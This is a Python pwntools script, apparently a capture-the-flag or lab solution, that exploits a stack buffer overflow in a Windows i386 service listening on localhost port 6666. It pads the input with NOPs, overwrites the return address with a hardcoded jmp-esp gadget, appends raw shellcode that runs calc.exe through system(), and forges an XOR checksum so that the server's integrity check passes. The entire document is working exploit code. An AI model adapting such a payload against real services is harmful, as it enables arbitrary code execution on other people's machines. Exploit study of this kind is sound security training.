from pwn import *

context.os='windows'
context.arch='i386'  
p = remote('127.0.0.1', 6666)

payload = b'\xef\xdf\x01\x02\xEF\xDF\x01\x02\x9d\x19\xe9\xc2'

# shellcode = asm(shellcraft.windows.execve(r'c:\windows\system32\calc.exe'))
# shellcode = shellcode.ljust(4*((len(shellcode)+3)//4),b'\x90')

shellcode = b"\xEB\x17\x5E\x33\xC0\x88\x46\x08\x8B\xDE\x53\xBB\xF0\x49\x53\x76\xFF\xD3\xBB\xF0\x7D\x55\x76\xFF\xD3\xE8\xE4\xFF\xFF\xFF\x63\x61\x6C\x63\x2E\x65\x78\x65\x64\x64\x64"

esp_addr = 0x756BBCA9
system_addr = 0x765349F0
exit_addr = 0x76557DF0

#payload += p32(0x0201DFEF)

payload += b'\x90' * (3028-12)
payload += p32(esp_addr) + b'\x90'*0x100+ shellcode
payload += b'\x01\x01\x01'

xor_value = 0
for i in range(len(payload) // 4):
    xor_value ^= u32(payload[i*4 : (i+1)*4])
print(hex(xor_value))
complement = xor_value ^ 0x12345678

print(hex(complement))
if complement != 0:
    payload += p32(complement)
p.send(p32(len(payload)))
p.send(payload)
p.interactive()
